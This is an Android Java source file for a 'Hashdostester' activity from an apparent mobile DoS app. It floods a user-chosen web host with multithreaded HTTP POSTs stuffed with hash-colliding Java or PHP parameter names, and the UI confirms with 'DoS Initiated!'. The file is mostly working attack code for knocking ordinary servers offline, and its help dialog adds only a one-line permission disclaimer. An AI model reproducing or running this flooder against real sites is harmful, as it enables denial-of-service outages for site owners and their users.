package net.openfiresecurity.ofsdoser;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.graphics.Color;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.DisplayMetrics;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.CompoundButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ProgressBar;
import android.widget.RadioButton;
import android.widget.SeekBar;
import android.widget.SeekBar.OnSeekBarChangeListener;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

public class Hashdostester extends Activity implements Runnable {

	private int[] states = new int[200];
	private List<String> javaH;
	private List<String> phpH;
	int packetsize = 100, threads = 2;
	String attacktype;
	private volatile Thread t;
	private RadioButton rbJava;
	ToggleButton tb;
	ProgressBar cpb;
	EditText etTarget;
	SeekBar sbThreads, sbPacketSize;
	boolean shouldRun = false;
	private ImageButton ibHashHelp;
	private TextView tvPacketSize, tvThreads;
	int[] col = { Color.GREEN, Color.BLUE, Color.YELLOW, Color.RED };

	/* Settings */
	boolean showStartupDialog = true;

	private void setScreen() {
		DisplayMetrics metrics = new DisplayMetrics();
		getWindowManager().getDefaultDisplay().getMetrics(metrics);
		int width = metrics.widthPixels;
		int height = metrics.heightPixels;
		if (!(width <= 320) || !(height <= 480)) {
			requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);
		} else {
			requestWindowFeature(Window.FEATURE_NO_TITLE);
			getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
					WindowManager.LayoutParams.FLAG_FULLSCREEN);
		}

		setContentView(R.layout.misc_hashdos);
		if (!(width <= 320) || !(height <= 480)) {
			getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE,
					R.layout.titlebar);

			/*
			 * Old installer
			 */
			// Install install = new Install(Hashdostester.this,
			// Utilities.getApplicationFolder(Hashdostester.this, "bin"),
			// false);
			// install.start();

			ImageButton titlebarButton1 = (ImageButton) findViewById(R.id.titlebarButton1);
			titlebarButton1.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					showExitDialog();
				}

			});
		}

		ImageButton ibPrefs = (ImageButton) findViewById(R.id.ibPrefs);
		ibPrefs.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				startActivity(new Intent(Hashdostester.this, Prefs.class));
			}

		});
	}

	@Override
	public boolean onKeyUp(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			showExitDialog();
			return (true);
		}
		return (false);
	}

	private void showExitDialog() {
		Builder dialog = new AlertDialog.Builder(Hashdostester.this);
		dialog.setTitle("Warning!").setMessage("Do you really want to exit?");
		dialog.setNegativeButton("Yes", new DialogInterface.OnClickListener() {

			@Override
			public void onClick(DialogInterface dialog, int which) {
				Runtime.getRuntime().exit(0);
			}

		});
		dialog.setPositiveButton("No", new DialogInterface.OnClickListener() {

			@Override
			public void onClick(DialogInterface dialog, int which) {
				dialog.dismiss();
			}

		});
		dialog.show();
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		try {
			setScreen();
			setupElements();
			getPrefs();

			if (showStartupDialog) {
				Builder dialog = new AlertDialog.Builder(this);
				dialog.setTitle("Welcome!")
						.setMessage(
								"Root is NOT needed!\n\n1.1.2\n+ Fixed a Force Close bug, thanks to whoever submitted the crash report!\n+ General Optimizations")
						.setNeutralButton("Ok.",
								new DialogInterface.OnClickListener() {

									@Override
									public void onClick(DialogInterface dialog,
											int which) {
										dialog.dismiss();
									}
								});
				dialog.show();
			}

			javaH = new ArrayList<String>(Lists.javaLIST.length);
			phpH = new ArrayList<String>(Lists.phpLIST.length);
			for (String s : Lists.javaLIST) {
				javaH.add(s);
			}
			for (String s : Lists.phpLIST) {
				phpH.add(s);
			}
			// if (BuildConfig.DEBUG) {
			// }
			tb = (ToggleButton) findViewById(R.id.tbHashDos);
			tb.setOnCheckedChangeListener(new OnCheckedChangeListener() {

				@Override
				public void onCheckedChanged(CompoundButton arg0, boolean arg1) {
					if (checkArguments()) {
						if (arg1) {
							makeToast("DoS Initiated!");
							cpb.setVisibility(View.VISIBLE);
							shouldRun = true;
							startThread();
						} else {
							makeToast("DoS Stopped!");
							cpb.setVisibility(View.INVISIBLE);
							shouldRun = false;
							try {
								stopThread();
							} catch (InterruptedException e) {
							}
						}
					} else {
						makeToast("Please recheck your Settings again.\nCouldnt start the DoS.");
						tb.setChecked(false);
					}
				}

				private boolean checkArguments() {
					boolean valid = true;
					String check = etTarget.getText().toString();
					if (!(check.contains("."))) {
						valid = false;
					}
					return (valid);
				}
			});

		} catch (Exception e) {
			Toast.makeText(Hashdostester.this, "CREATE: " + e.toString(),
					Toast.LENGTH_LONG).show();
		}
	}

	@Override
	protected void onPause() {
		super.onPause();
		if (isFinishing()) {
			Runtime.getRuntime().exit(0);
		}
	}

	private void getPrefs() {
		final SharedPreferences getPrefs = PreferenceManager
				.getDefaultSharedPreferences(getBaseContext());

		showStartupDialog = getPrefs.getBoolean("showStartupDialog", true);
	}

	public synchronized void startThread() {
		if (t == null) {
			t = new Thread(this);
			t.start();
		}
	}

	public synchronized void stopThread() throws InterruptedException {
		if (t != null) {
			Thread stopper = t;
			t.interrupt();
			t = null;
			stopper.interrupt();
		}
	}

	private void setupElements() {
		// RadioButton rbPHP = (RadioButton) findViewById(R.id.radio0);
		rbJava = (RadioButton) findViewById(R.id.radio1);
		//
		cpb = (ProgressBar) findViewById(R.id.cbpHash);
		cpb.setVisibility(View.INVISIBLE);
		//
		tvPacketSize = (TextView) findViewById(R.id.tvPacketSize);
		tvThreads = (TextView) findViewById(R.id.tvThreads);
		etTarget = (EditText) findViewById(R.id.etHashdosTarget);
		sbPacketSize = (SeekBar) findViewById(R.id.sbHashPacketSize);
		sbThreads = (SeekBar) findViewById(R.id.sbHashThreads);
		sbPacketSize.setMax(10240);
		sbThreads.setMax(256);
		sbPacketSize.setProgress(100);
		sbThreads.setProgress(1);
		sbThreads.setOnSeekBarChangeListener(new OnSeekBarChangeListener() {

			@Override
			public void onProgressChanged(SeekBar seekBar, int progress,
					boolean fromUser) {
				tvThreads.setText("" + (progress + 1));
			}

			@Override
			public void onStartTrackingTouch(SeekBar seekBar) {
			}

			@Override
			public void onStopTrackingTouch(SeekBar seekBar) {
			}

		});
		sbPacketSize.setOnSeekBarChangeListener(new OnSeekBarChangeListener() {

			@Override
			public void onProgressChanged(SeekBar seekBar, int progress,
					boolean fromUser) {
				tvPacketSize.setText("" + (progress + 1));
			}

			@Override
			public void onStartTrackingTouch(SeekBar seekBar) {
			}

			@Override
			public void onStopTrackingTouch(SeekBar seekBar) {
			}

		});
		tvPacketSize.setText("100");
		tvThreads.setText("1");
		ibHashHelp = (ImageButton) findViewById(R.id.ibHashHelp);
		ibHashHelp.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View arg0) {
				Builder helpDialog = new AlertDialog.Builder(Hashdostester.this);
				helpDialog
						.setTitle("Help")
						.setMessage(
								"App developed by:\n\t\t\t\tAlexander Martinz\n\nApp Version: "
										+ getVersionName()
										+ "\n\n\nThis is still BETA!\n\nYou may need a good phone to handle the Denial of Service attack!\n\nApp may crash on maxed out Values!\nExperiment yourself ;)\n\n\n\nDont initiate attacks against IP's without its Owners Permission!!!");
				helpDialog.setNeutralButton("I agree.",
						new DialogInterface.OnClickListener() {

							@Override
							public void onClick(DialogInterface dialog,
									int which) {
								dialog.dismiss();
							}
						});
				helpDialog.show();
			}

		});

	}

	private void makeToast(String msg) {
		Toast.makeText(Hashdostester.this, msg, Toast.LENGTH_LONG).show();
	}

	private void set(int i, int localState) {
		states[i] = localState;
	}

	public String getPost(List<String> completeList, int maxSize) {
		StringBuffer bu = new StringBuffer(maxSize);
		int reqSize = 0;
		for (int i = 0; i < completeList.size(); i++) {
			String value = completeList.get(i);
			reqSize += value.length() + 4;
			if (reqSize > (maxSize - 40)) {
				break;
			}
			bu.append("&");
			bu.append(value);
			bu.append("=a");
		}

		return bu.toString();
	}

	boolean demohash() {
		return true;
	}

	@Override
	public void run() {
		while (shouldRun) {
			threads = sbThreads.getProgress() + 1;
			packetsize = sbPacketSize.getProgress() + 1;

			int nbE = threads;
			String url = "http://" + etTarget.getText().toString() + "/";
			threadinject[] t = new threadinject[nbE];
			List<String> list;
			if (rbJava.isChecked()) {
				list = javaH;
			} else {
				list = phpH;
			}
			do {
				for (int i = 0; i < t.length; i++) {
					t[i] = new threadinject(url, getPost(list,
							packetsize * 1024));
				}
				for (int i = 0; i < t.length; i++) {
					t[i].start();
				}
				boolean stop;
				do {
					for (int i = 0; i < t.length; i++) {
						set(i, t[i].getLocalState());
					}

					updatePlease();

					try {
						Thread.sleep(300L);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					stop = true;
					for (int i = 0; i < t.length; i++) {
						if (states[i] < 6) {
							stop = false;
							break;

						}
					}
				} while (!stop);
			} while (shouldRun);
		}
		try {
			stopThread();
		} catch (InterruptedException e) {
		}
	}

	private void updatePlease() {
		// // TODO Visible Update Progress

	}

	public int getVersionNumber() {
		int version = -1;
		try {
			PackageInfo pi = getPackageManager().getPackageInfo(
					getPackageName(), 0);
			version = pi.versionCode;
		} catch (Exception e) {
		}
		return version;
	}

	public String getVersionName() {
		String version = "?";
		try {
			PackageInfo pi = getPackageManager().getPackageInfo(
					getPackageName(), 0);
			version = pi.versionName;
		} catch (Exception e) {
		}
		return version;
	}
}